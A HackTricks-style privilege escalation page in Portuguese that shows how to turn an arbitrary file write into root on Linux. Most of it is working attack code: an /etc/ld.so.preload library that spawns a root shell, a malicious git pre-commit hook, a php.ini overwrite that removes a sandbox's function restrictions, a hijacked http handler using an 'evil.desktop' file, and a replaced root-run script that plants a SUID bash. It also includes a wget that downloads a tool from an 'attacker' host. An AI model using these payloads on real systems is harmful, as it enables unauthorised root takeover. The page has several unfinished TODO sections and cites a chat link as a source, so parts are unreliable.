# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **SUID binaries**.\
Se você puder criá-lo ou modificá-lo, pode simplesmente adicionar um **caminho para uma biblioteca que será carregada** em cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git, como quando um commit é criado, um merge... Então, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **escrever na pasta `.git`**, isso pode ser usado para **privesc**.

Por exemplo, é possível **gerar um script** em um repositório git em **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons customizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restrito** (por exemplo, `disable_functions=exec,system,...`). Se o código sandboxed ainda tem **qualquer write primitive** (como `file_put_contents`) e você consegue alcançar o **caminho exato do `php.ini`** usado pelo daemon, você pode **sobrescrever essa config** para levantar as restrições e então submeter um segundo payload que será executado com privilégios elevados.

Fluxo típico:

1. Primeiro payload sobrescreve a config do sandbox.
2. Segundo payload executa código agora que funções perigosas foram reativadas.

Exemplo mínimo (substitua o caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar caminhos pertencentes ao root), a segunda execução produz um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime sandboxed ainda pode escrever arquivos.

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar qual tipo de arquivos. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

Um atacante com permissões de escrita nos diretórios de configuração da vítima pode facilmente substituir ou criar arquivos que mudam o comportamento do sistema, resultando em execução de código não intencional. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, definindo `x-scheme-handler/http=evil.desktop`), o atacante garante que **clicar em qualquer link http ou https acione o código especificado naquele arquivo `evil.desktop`**. Por exemplo, após colocar o seguinte código malicioso em `evil.desktop` em `$HOME/.local/share/applications`, qualquer clique em uma URL externa executa o comando embutido:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para mais informações, consulte [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) onde foi usado para explorar uma vulnerabilidade real.

### Root executando scripts/binários graváveis pelo usuário

Se um workflow privilegiado executa algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário não privilegiado), você pode sequestrá-lo:

- **Detecte a execução:** monitore processos com [pspy](https://github.com/DominicBreuker/pspy) para capturar root invocando caminhos controlados pelo usuário:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmar permissão de escrita:** garanta que tanto o arquivo alvo quanto o seu diretório sejam de propriedade e graváveis pelo seu usuário.
- **Hijack the target:** faça backup do binary/script original e coloque uma payload que cria um SUID shell (ou qualquer outra ação como root), então restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que gera o helper). Quando root re-executar o caminho sequestrado, capture o shell escalado com `./rootshell -p`.

## References

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
